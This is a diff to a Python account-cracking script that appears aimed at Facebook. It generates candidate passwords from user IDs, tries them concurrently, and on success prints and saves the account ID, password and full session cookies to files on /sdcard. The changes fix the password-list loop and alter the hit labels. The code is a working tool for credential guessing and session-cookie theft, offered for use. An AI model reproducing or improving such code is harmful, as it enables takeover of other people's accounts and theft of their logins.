@@ -280,8 +280,8 @@ def i():
         for love in user:
             pwx = [love[1:]]
             uid = code+love
-            for Eman in WaQasID:
-                pwx.append(ALi)
+            for Eman in hamiiID:
+                pwx.append(Eman)
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;32m============================================')
     print('Crack process has been completed')
@@ -334,7 +334,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(AWAIS-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(AWAIS-OKAI)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/AWAIS-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -342,7 +342,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(MALANG-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(MALANG-OKAI•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard(MALANG-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
